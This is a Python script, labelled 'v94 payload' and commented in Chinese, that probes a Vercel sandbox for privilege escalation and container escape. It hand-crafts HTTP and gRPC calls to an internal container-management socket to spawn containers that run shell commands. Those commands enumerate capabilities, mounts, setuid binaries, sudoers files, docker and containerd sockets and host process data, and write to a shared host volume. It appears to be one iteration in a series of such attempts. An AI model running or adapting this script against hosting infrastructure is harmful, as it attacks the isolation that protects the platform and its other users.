# -*- coding: utf-8 -*-
"""v94 payload: drive 容器内提权/逃逸面探测
v93 结论: uid=1000(vercel-sandbox), 独立 pid ns, cgroup v2 根, /vercel/sandbox 共享, 容器内 /proc/1/root=自身
v94: A CapEff+capsh+mountinfo  B cell.sock/containerd.sock 可达性  C setuid/sudo 提权面
     D /vercel 结构+宿主 proc 探测  E /run 其他 socket+挂载源
"""
import socket, time, os, json, re, struct, threading

OUT = '/vercel/sandbox/v94c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v94c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def grpc_req(pl):
    return b'\x00' + struct.pack('>I', len(pl)) + pl


class Keep:
    """保持连接: 后台线程发请求并持续读, 1s 轮询 stop"""
    def __init__(self, path, body, t=20):
        self.path, self.body, self.t = path, body, t
        self.data = bytearray()
        self.done = threading.Event()
        self._stop = threading.Event()
        self._err = None
        self._t = threading.Thread(target=self._run)
        self._t.daemon = True

    def _run(self):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect('/run/cell/cell.sock')
            req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
                   'Content-Length: %d\r\nConnection: keep-alive\r\n\r\n' % (self.path, len(self.body)))
            s.sendall(req.encode() + self.body)
            deadline = time.time() + self.t
            while not self._stop.is_set() and time.time() < deadline:
                try:
                    chunk = s.recv(8192)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if not chunk:
                    break
                self.data += chunk
            try:
                s.close()
            except Exception:
                pass
        except Exception as e:
            self._err = e
        self.done.set()

    def start(self):
        self._t.start()
        return self

    def stop(self):
        self._stop.set()

    def status(self):
        return 'done=%s err=%s data=%d' % (self.done.is_set(), self._err, len(self.data))


def extract_frames(d):
    """从 chunked HTTP body 提取 grpc 数据帧内容 (StreamOutputResponse.data 拼接)"""
    idx = d.find(b'\r\n\r\n')
    if idx >= 0:
        d = d[idx + 4:]
    out = b''
    while d:
        nl = d.find(b'\r\n')
        if nl < 0:
            break
        try:
            size = int(d[:nl], 16)
        except Exception:
            break
        if size == 0:
            break
        chunk = d[nl + 2:nl + 2 + size]
        if len(chunk) >= 5 and chunk[0] == 0:
            pl = chunk[5:]
            if pl.startswith(b'\x0a'):
                v = 0
                shift = 0
                i = 1
                while i < len(pl):
                    b = pl[i]
                    v |= (b & 0x7f) << shift
                    i += 1
                    if not (b & 0x80):
                        break
                    shift += 7
                out += pl[i:i + v]
        d = d[nl + 2 + size + 2:]
    return out


def main():
    log('V94 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    def create(body, tag):
        st, bd = rpc(CTR + '/Create', body, t=8)
        cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
        log('%s CREATE -> %s cid=%s' % (tag, st, cid or bd[:120]))
        return cid

    def run_cmd(tag, cmdline, wait=6):
        body = json.dumps({"drive_id": "sandbox", "command": "/bin/sh", "arguments": ["-c", cmdline]})
        cid = create(body, tag)
        if not cid:
            return
        k = Keep(CTR + '/StreamOutput', grpc_req(pstr(1, cid) + pvar(2, 1)), t=15).start()
        time.sleep(1.0)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('%s started, waiting %ds' % (tag, wait))
        time.sleep(wait)
        d = bytes(k.data)
        txt = extract_frames(d).decode(errors='replace')
        log('%s SO %s rawlen=%d' % (tag, k.status(), len(d)))
        log('%s OUT<<<\n%s\n>>>' % (tag, txt[:3000]))
        k.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('%s killed' % tag)
        time.sleep(0.5)

    # A. 能力与挂载
    run_cmd('A1', 'echo ===STATUS===; grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp" /proc/self/status; '
                  'echo ===CAPSH===; capsh --print 2>&1 | head -8; echo ===MOUNT===; mount 2>&1 | head -30; '
                  'echo ===MOUNTINFO===; cat /proc/self/mountinfo 2>&1 | head -20')

    # B. socket 可达性
    run_cmd('B1', 'echo ===RUN===; ls -la /run/ 2>&1 | head -25; echo ===CELL===; ls -la /run/cell/ 2>&1; '
                  'echo ===CONTAINERD===; ls -la /run/containerd/ 2>&1 | head; echo ===VDAX===; ls -la /mnt/vdax 2>&1 | head -5; '
                  'echo ===MNT===; ls -la /mnt/ 2>&1 | head')

    # C. setuid / sudo 提权面
    run_cmd('C1', 'echo ===SUDO===; ls -la /usr/bin/sudo /usr/bin/su /bin/su 2>&1; echo ===SUID===; '
                  'find / -xdev -perm -4000 -type f 2>/dev/null | head -15; echo ===SUDOERS===; '
                  'head -20 /etc/sudoers 2>&1; ls -la /etc/sudoers.d/ 2>&1 | head; echo ===USER===; '
                  'getent passwd 2>&1 | head -8')

    # D. /vercel 结构 + proc 探测
    run_cmd('D1', 'echo ===VERCEL===; find /vercel -maxdepth 3 2>/dev/null | head -40; echo ===PROC===; '
                  'ls /proc/ 2>&1 | head -20; echo ===PROC1===; tr "\\000" " " < /proc/1/cmdline 2>&1; echo; '
                  'echo ===NETNS===; ls -la /var/run/netns 2>&1; echo ===DOCKER===; '
                  'ls -la /var/run/docker.sock /run/docker.sock /var/run/containerd 2>&1')

    # E. 沙箱 COW 写 + cell API 自身放大测试
    run_cmd('E1', 'echo ===WRITE===; echo V94_E1_MARKER_11223 > /vercel/sandbox/v94_from_drive.txt 2>&1; '
                  'ls -la /vercel/sandbox/v94_from_drive.txt 2>&1; echo ===SELF===; '
                  'ls -la /vercel/sandbox/v94_payload.py 2>&1; echo ===HOMES===; ls -la /home 2>&1 | head')

    log('V94C_DONE')


main()
